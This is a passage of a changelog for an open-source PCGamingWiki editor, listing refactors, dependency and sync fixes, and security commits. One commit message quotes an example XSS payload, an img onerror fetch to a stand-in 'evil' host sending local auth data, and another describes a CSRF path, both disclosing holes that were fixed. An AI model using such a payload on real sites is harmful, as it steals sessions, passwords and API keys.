  > So the gate has been a no-op, which is how 21 genuine errors accumulated
  > unnoticed — `strict: true` was never actually enforced on anything.
  >
  > - build now runs `pnpm typecheck` = `vue-tsc -b --force`
  > - crypto.ts: b64ToBytes returns Uint8Array<ArrayBuffer> so it satisfies
  >   BufferSource (TS 5.7+ typed-array generics). Type-level only; PBKDF2/AES-GCM
  >   behaviour untouched
  > - types/schema.ts: new subFieldOf() narrows componentProps.field once, instead
  >   of three call sites probing a discriminated union that does not declare it
  > - AutocompleteField.vue: drop the legacy #item slot (openvue uses #option,
  >   already present, and no caller passed #item)
  > - 3 handlers now accept `string | string[]`, which is what AutocompleteField
  >   actually emits in single and multiple mode
  > - DynamicSection.vue: import the FieldDefinition type it referenced
  > - 6 of 9 @ts-ignore were suppressing nothing (resolveJsonModule is already on,
  >   vite/client already declares *.svg); the remaining 3 became @ts-expect-error
  >   so they fail once the underlying types improve
  > - removed unused locals flagged by noUnusedLocals, incl. a dead isMatch() stub
  >
  > Unrelated cleanups riding along: unused deps (shiki, mwn, sortablejs,
  > @codemirror/lang-markdown, @lezer/common, autoprefixer, postcss — 82 packages),
  > dead runtime values, and structuredClone for the 4 clone sites whose source is
  > plain data.
  >
  > structuredClone is NOT used for the other 3: it throws DataCloneError on Vue
  > reactive proxies (verified), and for the sync snapshot the JSON round-trip also
  > drops undefined optionals exactly as the encrypted payload would. Documented in
  > place so nobody "optimises" it later.
  >
  > workbox-window was kept: it is a peerDependency of vite-plugin-pwa, invisible
  > to a grep over src/.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/b731d07ffe0211c63cc89f0106a0de49b4c81bec"><code>b731d07</code></a> <b>security:</b> Stop wikitext XSS reaching innerHTML, and fix round-trip corruption</summary>

  > Wikitext is attacker-controlled — any wiki user can edit a PCGW page — and the
  > WYSIWYG editor feeds the converted HTML straight to node.innerHTML. Neither
  > wikitextToHtml() nor the wikiRender helpers escaped or sanitized anything, so a
  > payload like
  >
  >     [https://x.com <img src=x onerror=fetch('//evil/'+localStorage.pcgw_auth_data_v2)>]
  >
  > executed on page open, exfiltrating the session cookie, the persisted password
  > and all three AI API keys.
  >
  > Two different fixes, because the two paths differ:
  >
  > - wikiRender.ts: escape at source. renderInlineMarkup and renderInlineFragment
  >   now escape their input up front. Safe because esc() only touches & < > "
  >   while the wiki markup keys off ' [ ] |.
  >   renderInlineFragment was the subtler hole: it escaped only *inside* the link
  >   replacements, so link-free text — the common case, and what renderMmList
  >   feeds — passed through raw.
  > - htmlWikitextConverter.ts: sanitize the output. This function interleaves
  >   generated markup with raw wikitext in one string, so there is no single
  >   source to escape. New sanitizeEditorHtml() allowlists data-wikitext and
  >   contenteditable explicitly, because a bare DOMPurify.sanitize() drops them
  >   and would silently break wikitext recovery.
  >
  > Separately, a data-corruption bug the new tests surfaced: encodeURIComponent
  > does not encode apostrophes, so the bold/italic regexes — which run over the
  > whole string, attribute values included — rewrote the already-generated
  > data-wikitext. Any Fixbox containing ''' came back from the round-trip with
  > literal <strong> tags in its source. encWt() now encodes apostrophes too.
  >
  > Test environment switched from happy-dom to jsdom: under happy-dom DOMPurify
  > silently drops the first top-level element, so every sanitization assertion in
  > the suite was passing vacuously and these tests could not be written at all.
  > Needed a matchMedia stub, which jsdom does not implement.
  >
  > All of the above verified in a real browser (Vite dev + Playwright), not only
  > under jsdom: round-trip byte-identical through both data-wikitext recovery and
  > htmlToWikitext, onerror stripped, Fixbox still renders.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/c61c0688d01f5e2c114d3b08b4b62b4f95a531ab"><code>c61c068</code></a> <b>security:</b> Close worker CSRF, validate synced snapshots, tighten CSP</summary>

  > worker.js (a hand-synced copy of the deployed Cloudflare Worker):
  >
  > - CSRF, the critical one. `credentialed` was only used to pick response CORS
  >   headers; the Origin was never checked on the request path. With
  >   ALLOWED_ORIGINS set the session lives in a SameSite=None cookie, and a
  >   multipart/form-data POST is a "simple request" with no preflight — so an
  >   attacker's page could POST to /api/proxy, have the worker pick up the
  >   victim's cookie and fetch a fresh csrftoken server-side. The response stayed
  >   unreadable, but the edit or upload had already happened.
  >   cookieFromHeader() now returns nothing unless the Origin is allowlisted, and
  >   any request relying on that ambient cookie must carry X-Requested-With — a
  >   header a cross-origin form cannot set, so it forces a preflight.
  > - action allowlist on /api/proxy. It forwarded every parameter, so the same
  >   CSRF also reached delete/block for privileged accounts. Actions were
  >   enumerated from the client, not guessed: 'move' was in use and would have
  >   broken under a guessed list.
  > - per-host method allowlist on /api/ext, previously a CORS relay that accepted
  >   any verb from any caller on the internet.
  > - /api/image cache key now includes the origin; the per-origin
  >   Access-Control-Allow-Origin was being cached and served to other origins.
  > - rate limiting is still absent on every endpoint (notably /api/login, i.e.
  >   password guessing at the owner's expense). Left a note: that is Cloudflare
  >   dashboard config, not worker code.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/895a93e62a1e16d6ce8decaba1daa69744dce3f1"><code>895a93e</code></a> <b>sync:</b> Guard Drive writes with If-Match, serialize pull&#x2F;push, stop two leaks</summary>

  > Data loss. writeBlob sent no precondition, and syncNow ran pull() then push()
  > with nothing serialising them — so two devices editing in parallel were a blind
  > last-write-wins over the entire snapshot: whoever wrote second erased the
  > other's pages. readBlob/locate now track Drive's headRevisionId and writeBlob
  > sends it as If-Match; a 412 raises PreconditionFailedError, which push handles
  > by pulling, merging and republishing the union (once, then it reports rather
  > than looping against a busy peer).
  >
  > A subtlety worth stating because getting it wrong silently disables the guard:
  > on 412 the provider clears fileId as well as headRevisionId. readBlob only
  > refreshes the revision through locate(), so keeping fileId would leave the
  > revision null and send the *next* write with no If-Match at all — precisely when
  > a collision had just been detected. locate() matches by name, so this cannot
  > create a duplicate.
  >
  > Latent duplicate-file bug found while refactoring: writeBlob computed url,
  > metadata and body *before* its 401 retry. If locate() then discovered the file
  > mid-retry, the retried request still POSTed to the "create" endpoint and made a
  > second copy. The retry logic is now one authedFetch() that takes a build
  > callback, so the request is re-derived after the token refresh. This also
  > de-duplicates the 401 handling that was copy-pasted into readBlob and writeBlob.
  >
  > pull/push run through a single promise chain. Failures are caught so one error
  > cannot poison the queue.
  >
  > Leaks and thrash:
  > - CodeEditor's MutationObserver was stashed on editorView, but a theme change
  >   replaces editorView with a fresh instance lacking that property — onUnmounted
  >   read undefined, skipped disconnect(), and the observer kept spawning orphan
  >   editors for the whole session. It now lives in the setup scope and is
  >   disconnected unconditionally.
  > - the sync watcher dropped `deep: true` over ws.pages, which walked every page's
  >   full wikitext on every keystroke ahead of its own 8s debounce. A
  >   id:lastModified fingerprint is all push keys off. AI key *values* stay in the
  >   fingerprint, not just their presence, or editing a key would stop syncing.
  > - reconnect-on-activity was a Drive request plus an AES decrypt on every single
  >   click while disconnected, with the error swallowed. Now pointerdown, throttled
  >   to 30s.
  > - usePreview used a hand-rolled debounce whose timeout nothing cleared, and its
  >   in-flight request was only aborted by the *next* call. Now useDebounceFn
  >   (already a dependency) plus an onScopeDispose abort.
  >
  > Adds the first tests for GoogleDriveProvider, which had none: If-Match is sent,
  > 412 surfaces, the post-412 write cannot skip the precondition, creation omits
  > it, and the 401 retry rebuilds its request. 774 tests green.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/4121780a6982e1cde52ff6bfff2fae995bc226b4"><code>4121780</code></a> Scope X-Requested-With to the worker — it broke every direct MediaWiki call</summary>

  > Regression I introduced in c61c068. Making X-Requested-With unconditional in
  > getApiHeaders() put it on requests that go straight to the MediaWiki API, not
  > just on requests to our worker.
  >
  > X-Requested-With is not a CORS-safelisted header, so it forces a preflight, and
  > MediaWiki's anonymous CORS mode (`origin=*`) only answers a preflight for the
  > headers it explicitly allows. Api-User-Agent is allowed; arbitrary ones are not.
  > Every direct call therefore died with "Response to preflight request doesn't pass
  > access control check: No 'Access-Control-Allow-Origin' header is present" —
  > cover images, image info, cargoquery, opensearch, the lot.
  >
  > Isolated in a browser rather than reasoned about:
  >   no custom headers      -> 200
  >   Api-User-Agent only    -> 200
  >   X-Requested-With only  -> Failed to fetch
  >   both                   -> Failed to fetch
  >
  > getApiHeaders() is now for MediaWiki and carries only the user agent.
  > getWorkerHeaders() adds X-Requested-With and is used at the two worker call
  > sites in pcgwAuth (the proxy funnel and login). The worker allows the header in
  > its own CORS config, so the CSRF barrier is intact — it just no longer leaks onto
  > requests that cannot tolerate it.
  >
  > The /api/ext calls in MetadataFillerService are untouched: they use bare fetch
  > and carry user-supplied API keys rather than the ambient session, so they never
  > needed the header.
  >
  > Verified against the live wiki: getImageInfo('Halo Campaign Evolved cover.jpg')
  > returns its proxied URL and searchPages('Halo') returns 10 results, with zero
  > console errors where there were 10.
  >
  > I had seen these CORS errors during earlier browser checks and written them off
  > as pre-existing localhost noise. That was wrong — they were mine, and dismissing
  > them instead of isolating them is what let this reach you.
  >
  > Tests pin it both ways now: getApiHeaders() must NOT contain X-Requested-With,
  > getWorkerHeaders() must.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/eeafe8ed9169e78e7625ee088b3317fef24bfc7a"><code>eeafe8e</code></a> <b>build:</b> Restore @lezer&#x2F;common resolution — broke on clean installs only</summary>

  > Second regression from the Fase 1 dependency cleanup, and it only surfaced on
  > Vercel:
  >
  >   Rolldown failed to resolve import "@lezer/common" from
  >   .../@bhsd/codemirror-css-color-picker/dist/css.js
  >
  > @bhsd/codemirror-css-color-picker (reached via @bhsd/codemirror-wikitext) imports
  > @lezer/common while declaring it in neither dependencies nor peerDependencies —
  > a bug in its own manifest. Under pnpm's isolated node_modules a package can only
  > resolve what it declares, so removing the root entry took away the only thing
  > making it resolvable.
  >
  > Why local verification missed it: `pnpm remove` left @lezer/common physically in
  > node_modules/.pnpm and in pnpm's hoisted fallback directory, so every local build
  > kept resolving it. A clean install has no such copy. My audit note called it
  > "transitive of CodeMirror, not needed in dependencies" — wrong: it was covering
  > for an undeclared dependency.
  >
  > Fixed with packageExtensions rather than re-adding a root dependency. We do not
  > import @lezer/common ourselves, so a root entry reads as unused and invites
  > removal — which is precisely how this broke. Declaring it on the offending
  > package fixes the actual cause and carries a comment explaining why it must stay.
  >
  > Verified the way it should have been the first time: rm -rf node_modules, fresh
  > install, then the full gate. --frozen-lockfile also passes (the lockfile carries
  > the new packageExtensionsChecksum, which is why it needed regenerating).
  >
  > Clean install: typecheck 0 errors, lint 0 errors, 775 tests, build exit 0.

  </details>

### ⚡ Performance Improvements

- [`3ff33e3`](https://github.com/maicol07/pcgw_editor/commit/3ff33e3845114cc8c46fde4a726ba58d9f2030d7) Optimize animations with hardware acceleration and will-change properties
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/d396b2f92e652bc8be0e241c0e534ac9bd9ef325"><code>d396b2f</code></a> Cut startup payload — vendor 22 flags, defer Quill&#x2F;AI SDK&#x2F;CodeMirror</summary>

  > Measured in a real browser against the production build, not inferred from the
  > build log.

  </details>

### 💄 UI & Style

- [`97629a0`](https://github.com/maicol07/pcgw_editor/commit/97629a0c4eb49054387ef14faca2d6212eeff2d2) Update UI design tokens and refine workspace sidebar aesthetics
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/9439f5b44a06bff6855d34b8334cddd7193da83e"><code>9439f5b</code></a> <b>ui:</b> Accessibility and responsive polish for dialogs and settings</summary>

  > Normalize tiny text to text-xs, fix tap targets and focus rings, make dialogs responsive on small screens, use proper severity for destructive actions, and cap tooltip width.

  </details>
- [`3ef9dce`](https://github.com/maicol07/pcgw_editor/commit/3ef9dce14979b7edfdf21ce96cebc545619c2700) Increase stub warning icon size and add shrink-0 class
- [`f3ddb9e`](https://github.com/maicol07/pcgw_editor/commit/f3ddb9e1b4384cfa9c6e16062a1a83e34b881189) Update surface-card utility with refined shadows, borders, and hover effects
- [`48fd528`](https://github.com/maicol07/pcgw_editor/commit/48fd528169ab2f55b43b401e5b5ae2524ca49991) Improve responsive layout using CSS container queries and flexible grid sizing
- [`cfadf4a`](https://github.com/maicol07/pcgw_editor/commit/cfadf4a15940f417c81c1132724cce64203e2486) Increase size and improve alignment of ShieldAlert icon in PcgwLoginDialog

### ♻️ Code Refactoring

- [`7ac03b2`](https://github.com/maicol07/pcgw_editor/commit/7ac03b234c2bf9dd4e8a7a0435c29f296b743d3b) Remove custom dynamic option creation and editable fields from forms and schema components
- [`d56dc48`](https://github.com/maicol07/pcgw_editor/commit/d56dc4877a6466b93c0f983dcc4176b4c5270981) Optimize updateRow to mutate array elements directly before triggering reactivity update
- [`f501216`](https://github.com/maicol07/pcgw_editor/commit/f501216425afbd0df8276eb12b5b26dbe7f7c791) Update store and DRM icons mappings, remove deprecated assets and fix imports in GameDataPathForm
- [`0ece073`](https://github.com/maicol07/pcgw_editor/commit/0ece073211361a16a4251b32b912ed0467566a0d) Group icons by category and add scoped category search to getIconSrc to avoid collisions
- [`2c372aa`](https://github.com/maicol07/pcgw_editor/commit/2c372aa9c099cc53508ea019042d8c11b039ba41) Simplify system requirements alternative newline formatting and add validation test
- [`4cff4a3`](https://github.com/maicol07/pcgw_editor/commit/4cff4a3b22a8d1499656956ebaea4024ec398c41) Remove global PrimeVue config from unit tests and centralize Dexie mocking in setup file
- [`9ebf1ad`](https://github.com/maicol07/pcgw_editor/commit/9ebf1ad8c86cc54a2cf676edc3bf6526dd6f4f22) Migrate settings UI to tabbed interface and add password visibility toggles
- [`7a7a0de`](https://github.com/maicol07/pcgw_editor/commit/7a7a0de2a9265aa45f838eee67e737619ed8599f) Update theme primary color to blue and refine UI component styling
- [`ee51e13`](https://github.com/maicol07/pcgw_editor/commit/ee51e135dc3ed1a512dfada7204be3280b83a0fc) Redesign AppSettings navigation and integration forms to match workspace UI styles
- [`ea5f931`](https://github.com/maicol07/pcgw_editor/commit/ea5f931b65ad9e9e801b95d5a338fde0d8e017b8) Enhance sidebar UI, add page import, and replace native rename/delete prompts with custom dialogs and confirmations
- [`2b45f7c`](https://github.com/maicol07/pcgw_editor/commit/2b45f7cb18e22214be6660c120d24c70af37e1a6) Update TaxonomyField layout to use stretch items and remove height constraints
- [`6a5c836`](https://github.com/maicol07/pcgw_editor/commit/6a5c83636803665408543a95fdb97e6bcf60c507) Replace InputChips with AutoComplete and fix attribute inheritance in PathInputField
- [`3ce6a0a`](https://github.com/maicol07/pcgw_editor/commit/3ce6a0a6773b2048429a37692f0c00481b4704ec) Replace InputChips with AutoComplete component to support PrimeVue v4 migration
- [`9f90290`](https://github.com/maicol07/pcgw_editor/commit/9f902909a64762277cdccb71d54e8d49f6f547ed) Replace GeminiService with unified AIService and centralized configuration management
- [`272f637`](https://github.com/maicol07/pcgw_editor/commit/272f6377cab33b865bcc0b2cd8279392362a44bb) Update PreviewPanel and EditorToolbar to use icon-based SelectButtons
- [`25aa22d`](https://github.com/maicol07/pcgw_editor/commit/25aa22d30a94c602cb96e1e8068c0ec2730f3ea9) Reorganize sidebar footer to display version info and icon-only links side-by-side
- [`6f352e8`](https://github.com/maicol07/pcgw_editor/commit/6f352e83d95418ad63f9e274e904b7d34bf68195) Redesign PCGW sync menu with integrated check-for-updates button and unified pull/publish actions
- [`a51cce9`](https://github.com/maicol07/pcgw_editor/commit/a51cce9a4c7ae07044334ff226bb554de030394a) Migrate layout to container queries and update link fields with icons and refined grid sizing
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/f4993c7c835214201e0fbb73758a49bd0849bd4b"><code>f4993c7</code></a> Remove dead legacy *Form components and their tests</summary>

  > TechnicalSpecsForm was mounted nowhere and was the sole user of the
  > Video/Input/Audio/Network/VRSupport forms. The editor renders these
  > sections from the schema (config/fields.ts) via DynamicSection, so the
  > standalone forms — and the duplicate features/video/VideoAnalysis.vue —
  > were dead code. Removes them along with their now-orphaned unit tests.

  </details>
- [`55a7d05`](https://github.com/maicol07/pcgw_editor/commit/55a7d053691bed27791f63e03c1269676feb1d76) Update unit test stubs and selectors to accommodate UI component changes across test suite
- [`1374591`](https://github.com/maicol07/pcgw_editor/commit/13745911e00b0cd2b7c63b7c0e03059cbf9b2bf1) Remove automatic sidebar visibility toggle on workspace initialization
- [`3706ddf`](https://github.com/maicol07/pcgw_editor/commit/3706ddf93ac79894861a5b11eab839b862e5e847) Optimize imports, lazy-load CodeEditor, and switch CSS minification to lightningcss
- [`415c3ba`](https://github.com/maicol07/pcgw_editor/commit/415c3ba9c177523fdedf6f9ddcf77e97eab1dcfb) Implement new surface-card utility and apply it across form components
- [`6501844`](https://github.com/maicol07/pcgw_editor/commit/65018441eeff265209e50f29101643fc1c6c9b6a) Remove silent token refresh cooldown from GoogleDriveProvider
- [`fb729e1`](https://github.com/maicol07/pcgw_editor/commit/fb729e192c6ed73a4e026ba57d73803b0a039ff5) Migrate component library imports from primevue to openvue
- [`a0d9fb1`](https://github.com/maicol07/pcgw_editor/commit/a0d9fb1d37d15541b7a00357be3b557c97a6f55e) Migrate lucide-vue-next dependency to @lucide/vue across all components and tests
- [`34267d7`](https://github.com/maicol07/pcgw_editor/commit/34267d750ad394b212d85a2f57e32d1281926cd2) Improve 3-way merge accuracy by fetching the actual ancestor revision and fixing deletion range handling.
- [`a7ec5ac`](https://github.com/maicol07/pcgw_editor/commit/a7ec5ac6967f2fefc3cd457907c3b3a6ad6c9375) Nest SCSS selectors in icon definitions and fix missing semicolons in style sheets
- [`2558d0a`](https://github.com/maicol07/pcgw_editor/commit/2558d0a8f80bc3ba94328865a9e4a6d3734ad409) Update AppSettings save button to use Lucide Check icon instead of PrimeIcons

### 📝 Docs changes

- [`b8f1fd1`](https://github.com/maicol07/pcgw_editor/commit/b8f1fd1d92f621190b8a277d074d12b51293e35b) Update README with deployment badges and revised development philosophy section
- [`5938330`](https://github.com/maicol07/pcgw_editor/commit/59383304c20cabb69f5263b6ec87e1bc54c5468e) Update README to clarify AI tool stack and IDE usage
- [`8e4fa66`](https://github.com/maicol07/pcgw_editor/commit/8e4fa66047873a9d0175be78e7d9b2c9ffa62e81) Update used AI tools in README
- [`01310e0`](https://github.com/maicol07/pcgw_editor/commit/01310e0e2070a3a359ac3392d589ab3dad756e1e) Document worker deploy and the httpOnly auth opt-in

### ✅ Tests

- [`6b483e2`](https://github.com/maicol07/pcgw_editor/commit/6b483e21908cb0cb9bf1947389f26df4c13ad032) Replace static database mock with dynamic Dexie proxy and suppress experimental localStorage warnings
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/2574eddc0629d16fe37c9892fde25202ad08a58f"><code>2574edd</code></a> <b>editor:</b> Cover token, mm and fixbox-reference round-trips</summary>

  > Add round-trip and rendering tests for the new chips, {{mm}} lists and the
  > fixbox nested-reference case, and update the existing converter specs to the
  > new chip behaviour (verbatim data-wikitext, <ref> rendered as a chip).

  </details>
- [`a605ceb`](https://github.com/maicol07/pcgw_editor/commit/a605cebe3783eb34c1484eef512b3cdd73b8ad65) Update DynamicField unit test to assert helper text visibility via tooltip directive
- [`70af636`](https://github.com/maicol07/pcgw_editor/commit/70af636364577c4abb6824f8759dc4849933aa66) Update merge conflict resolution test, move package overrides, and refactor QuickActions tests with Pinia integration

### 👷 Building scripts changes

- [`e4c3594`](https://github.com/maicol07/pcgw_editor/commit/e4c3594ce5eface34649f7bbc5c9d9687ffa5399) Update GitHub Actions dependencies and upgrade Node.js to version 24
- [`3787ab0`](https://github.com/maicol07/pcgw_editor/commit/3787ab069b85e794193b68ccf1ed7b06c9bfd8d6) Add @parcel/watcher and esbuild to pnpm-workspace allowBuilds

### Other changes

- [`a52f015`](https://github.com/maicol07/pcgw_editor/commit/a52f0154eb94652d6eb84098f3e4f8ddfe97c641) Update dependencies and configure pnpm workspace builds
- [`8b63684`](https://github.com/maicol07/pcgw_editor/commit/8b63684f78bdf133da92616ca1b76c89edfa9e8c) Update pnpm workspace configuration and action version
- [`c9b3505`](https://github.com/maicol07/pcgw_editor/commit/c9b3505ba41116851b8d4d94e601264e12d4b95a) Rename store icons to match updated naming conventions for Ubisoft, EA, and Microsoft
- [`df7f418`](https://github.com/maicol07/pcgw_editor/commit/df7f41872d66ec7eb648fac8895ed0c44f450c61) Update dependencies and devDependencies to latest versions
- [`3007b45`](https://github.com/maicol07/pcgw_editor/commit/3007b453a7242f77d24bd8551ad826e5c7090ebf) Update configure-pages to v6 and revert upload-pages-artifact to v5
- [`60c021f`](https://github.com/maicol07/pcgw_editor/commit/60c021f46ecfbe1f466aad4c3f2365a1f1ce1732) Update dependencies and remove package-lock.json in favor of pnpm-lock.yaml
- [`1d1f68a`](https://github.com/maicol07/pcgw_editor/commit/1d1f68adeedb636c5850b946dbf7a8f43a9122c8) **deps:** Update dependencies @ai-sdk/openai, @bhsd/codemirror-wikitext, and mwn
- [`c8bc65d`](https://github.com/maicol07/pcgw_editor/commit/c8bc65de544a5d755d636a97b8b1cc813415a19c) Update project dependencies to latest versions
- [`db1194d`](https://github.com/maicol07/pcgw_editor/commit/db1194d54c005dfc829f884ff8f1f53487c7d71e) **deps:** Downgrade typescript dependency
- [`9c39c3c`](https://github.com/maicol07/pcgw_editor/commit/9c39c3c2f3e3b385a0538ab1d942d350d1a0e173) Upgrade pnpm to version 11.18.0
- [`6b56bed`](https://github.com/maicol07/pcgw_editor/commit/6b56bed179762a7a57b81240438163ab6c752e2e) Downgrade typescript version to 5.8.2 in package.json
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/5b471203c583121ced07765541726046f837ae08"><code>5b47120</code></a> Delete dead code, orphaned components and duplicated agent skills</summary>

  > Removed 5,145 lines that nothing reaches from src/main.ts. Verified per file by
  > reachability, not by name grep — the schema-driven registry in
  > components/schema/DynamicField.vue resolves components through static imports,
  > so import-graph analysis is sound here.
  >
  > - 3 stylesheets with zero imports anywhere (pcgw-preview, wiki-preview,
  >   modern-ui): 2,005 lines
  > - orphaned components/services superseded by DynamicSection + config/fields.ts
  > - 4 *Form.vue kept alive only by their own tests, deleted with the tests
  > - utils/db.ts: legacy duplicate of db/index.ts (all importers use the latter)
  > - SchemaService.ts together with SchemaPlayground.vue, its only consumer
  > - sync/SyncProvider.ts: an interface with one implementation whose own comment
  >   admitted it was speculative
  > - .agents/skills/ai-sdk/**: byte-identical duplicate of .claude/skills/ai-sdk/**
  > - test-convert.js: 4 lines, 3 of them a comment saying it does not work
  >
  > Also gitignore *.tsbuildinfo (now produced by vue-tsc -b) and .playwright-mcp/.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/8f6e8691b6c9ebd66940e35a5259439461a291cc"><code>8f6e869</code></a> Add ESLint, gate CI on types and lint, measure coverage baseline</summary>

  > There was no linter at all — the giveaway being an eslint-disable comment in
  > ReleaseNotesDialog.vue that nothing has read for however long it has been there.
  >
  > The config is deliberately narrow. ~776 of the initial 1006 hits were pure
  > formatting (html-closing-bracket-newline, attribute-hyphenation and friends);
  > those are off, because they say nothing about whether the code works and would
  > have buried the findings that do. What is kept targets the defect classes this
  > audit actually turned up: unsanitized v-html, unlabelled form controls, and
  > @ts-ignore used where @ts-expect-error belongs.
  >
  > Three genuine defects it found straight away, all invisible until now:
  >
  > - DynamicSection had v-memo on DynamicField *inside* v-for. Vue documents that
  >   as a no-op, so the memoisation never once fired. Removed; the :key is what
  >   drives reconciliation.
  > - DynamicField declared two <template #option> blocks with mutually exclusive
  >   v-if. A component cannot receive two templates for one slot — the compiler
  >   keeps one, so the MultiSelect-with-icons variant silently never rendered.
  >   Merged into a single template that branches internally.
  > - GameDataForm wrote directly into modelValue.* and had no emit at all. It
  >   worked only because the object is reactive; a parent holding an immutable copy
  >   (DynamicSection rebuilds state via updateDeep) could miss the change. Each
  >   field now round-trips through update:modelValue.
  >
  > The a11y plugin's autofix also added role/tabindex/keydown/aria-expanded to the
  > collapsible group headers in DynamicSection, which were div-only click targets.

  </details>
- [`4dee72f`](https://github.com/maicol07/pcgw_editor/commit/4dee72fae5c0949a67beade1f7f40ab53cf990b0) Update dependencies and devDependencies to latest versions

<a name="1.9.1"></a>
## [1.9.1](https://github.com/maicol07/pcgw_editor/compare/1.8.3...1.9.1)

> Released on May 12, 2026

### ✨ Features

- [`6c1cb3d`](https://github.com/maicol07/pcgw_editor/commit/6c1cb3d9258a0e12369038c9d97f5901481b1fac) Add support for new reference types and optional ref-tag wrapping in NotesEditorDialog
- [`c4e8553`](https://github.com/maicol07/pcgw_editor/commit/c4e8553857851c0bc150982690a5faedb6ccdef4) Replace code block formatting with {{Code}} template and update editor toolbar button
- [`4ce8d61`](https://github.com/maicol07/pcgw_editor/commit/4ce8d6132e2c787d302e8864e534b03c6f2a045a) Add keyboard key selector and reorderable input to NotesEditorDialog with improved reference parameter parsing
- [`0afb266`](https://github.com/maicol07/pcgw_editor/commit/0afb26663c183c394e996b2752ee201c126c9bf4) Unify image replacement logic and add toggle functionality between local and PCGW sources in SectionGallery
- [`c499841`](https://github.com/maicol07/pcgw_editor/commit/c499841b3b3a46403436b65e07fba188b9ab055c) Inject custom User-Agent headers into all API and authentication requests
- [`773813c`](https://github.com/maicol07/pcgw_editor/commit/773813c8d606e721f900c91610151881fa6b3ef2) Add iCloud support to cloud sync configuration and models
- [`1ed5b9b`](https://github.com/maicol07/pcgw_editor/commit/1ed5b9b0a218b80fa4c2331ef0c75495bb6c1d19) Add GitHub Actions workflow to automate releases on tag push
- [`7f80934`](https://github.com/maicol07/pcgw_editor/commit/7f80934afc49ffc5193af8c4584b0bc4609fe923) Implement global request queue and automatic rate-limit handling for API requests

### 🐛 Bug Fixes

- [`b262849`](https://github.com/maicol07/pcgw_editor/commit/b262849fe22727a2d44681617c47b2d7931f0fef) Allow replacing existing gallery images with combined images
- [`91a8980`](https://github.com/maicol07/pcgw_editor/commit/91a898061ec4eb309a49b338fb94091c59396926) Add missing headers to CORS policy in worker.js
- [`a3bcf29`](https://github.com/maicol07/pcgw_editor/commit/a3bcf29e5587afe34acaef114f92f457bd318cff) Handle additional file upload warning types and add corresponding unit tests

### ♻️ Code Refactoring

- [`12df56b`](https://github.com/maicol07/pcgw_editor/commit/12df56be46483873344a944ea5abc8460dc96729) Remove unused User and Template reference buttons and redundant text formatting options
- [`e6ef7c6`](https://github.com/maicol07/pcgw_editor/commit/e6ef7c655c1408a6ae1d22ddda18daace3df7b9f) Migrate auth service tests to use apiFetch and consolidate unit test files

### 👷 CI changes

- [`1fe39a4`](https://github.com/maicol07/pcgw_editor/commit/1fe39a404a28290aeabd3b16932f5ab51549685d) Add workflow_call trigger to deploy and integrate deployment job into release pipeline

### Other changes

- [`8f33da5`](https://github.com/maicol07/pcgw_editor/commit/8f33da51e0aba21a5cd3350c13f049c49798c131) Update project dependencies and lockfile

<a name="1.8.3"></a>
## [1.8.3](https://github.com/maicol07/pcgw_editor/compare/1.8.2...1.8.3)

> Released on April 12, 2026

### ♻️ Code Refactoring

- [`458e851`](https://github.com/maicol07/pcgw_editor/commit/458e851a1a800a8d0d74a6a53423dbbced948ff5) Reorder template options and update default new page template to singleplayer

<a name="1.8.2"></a>
## [1.8.2](https://github.com/maicol07/pcgw_editor/compare/1.8.1...1.8.2)

> Released on April 12, 2026

### ✨ Features

- [`96e5e5d`](https://github.com/maicol07/pcgw_editor/commit/96e5e5d2f05c309a133742e7a223e06cd3be7844) Update license options and adjust corresponding unit test expectations

<a name="1.8.1"></a>
## [1.8.1](https://github.com/maicol07/pcgw_editor/compare/1.2.1...1.8.1)

> Released on April 12, 2026

### ✨ Features

- [`1e0da96`](https://github.com/maicol07/pcgw_editor/commit/1e0da96bef887b7293deef242eb25c8a79ba7992) Add Gemini AI service to analyze video settings screenshots and auto-fill form fields.
- [`87eb5dc`](https://github.com/maicol07/pcgw_editor/commit/87eb5dc9c12930f05efba5eb51bba37550c36944) Refactor release date management into a dedicated component and composable using `date-fns`, and centralize user search API calls.
- [`3fdfd69`](https://github.com/maicol07/pcgw_editor/commit/3fdfd69b3c4f1676bd4c148e5f99949cfc72498f) Implement schema-driven form components and infobox editors
- [`f9d7031`](https://github.com/maicol07/pcgw_editor/commit/f9d7031300b4a6cbe091aee9daa7bc4392bab3de) Implement a preview legend to navigate rendered content by extracting and generating IDs for headings.
- [`e56a3c5`](https://github.com/maicol07/pcgw_editor/commit/e56a3c54a749ec9430d997d57125efa1f4827a3b) Add MIT license file and declare it in package.json.
- [`c44359e`](https://github.com/maicol07/pcgw_editor/commit/c44359e99252ab8e9c2e5b5bf64c3359fcc1f68c) Add wikitext generation and editing for Infobox reception and taxonomy fields, including new tests and UI configuration.
- [`941e7b0`](https://github.com/maicol07/pcgw_editor/commit/941e7b047c1b08e43e4b53919a882782f4197f90) Introduce ModernPanel component and refactor form components with updated styling and layout improvements.
- [`ef20c4c`](https://github.com/maicol07/pcgw_editor/commit/ef20c4c4b06fc1b2c665bcd296d7024d5a4d3cb7) Introduce Vitest for testing, add comprehensive schema integrity tests, and extend wikitext parsing and writing for monetization, microtransactions, and video awards.
- [`e6d0c47`](https://github.com/maicol07/pcgw_editor/commit/e6d0c47a13d65724f284e730b298b4e5b1e98220) Implement AI-powered video analysis and summary generation, and enhance editor UI with quick actions and panel state management.
- [`2d3c174`](https://github.com/maicol07/pcgw_editor/commit/2d3c174d26e6087f509599201dc4a83e7c0f382c) Implement a compact UI mode with persistent state, dedicated styling, and a toolbar toggle.
- [`62a5954`](https://github.com/maicol07/pcgw_editor/commit/62a5954c27d6b9e4dad56cfc2f27422a0081df30) Add parsing, writing, and UI display for wikitext galleries, along with new tests.
- [`c74d57b`](https://github.com/maicol07/pcgw_editor/commit/c74d57bb98cf43ae8cd08791f37e2c61ce974554) Implement a three-level UI density control (normal, comfortable, compact) with a slider, replacing the binary compact mode toggle.
